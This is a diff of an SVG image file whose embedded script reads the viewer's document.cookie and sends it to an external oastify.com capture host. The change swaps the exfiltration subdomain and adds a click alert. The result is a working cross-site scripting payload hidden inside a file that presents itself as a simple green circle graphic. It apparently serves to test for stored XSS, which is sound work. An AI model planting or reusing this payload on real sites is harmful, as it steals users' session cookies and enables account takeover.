@@ -1,9 +1,9 @@
 <svg width="100%" height="100%" viewBox="0 0 100 100"
     xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"
     style="position: absolute; top: 0; left: 0; width: 100%; height: 100%;">
-    <circle cx="50" cy="50" r="45" fill="green" id="foo" o="foo"/>
+    <circle cx="50" cy="50" r="45" fill="green" id="foo" onclick="alert('Círculo clickeado!')" />
     <script><![CDATA[
         var img = new Image();
-        img.src = "https://b2edaswc7f6mj9daw9gbfk8r1i79v1jq.oastify.com/?hola=" + encodeURIComponent(document.cookie);
+        img.src = "https://4di5b92x1vcf3zf4j9ms9rxd046vumib.oastify.com/?hola=" + encodeURIComponent(document.cookie);
     ]]></script>
 </svg>
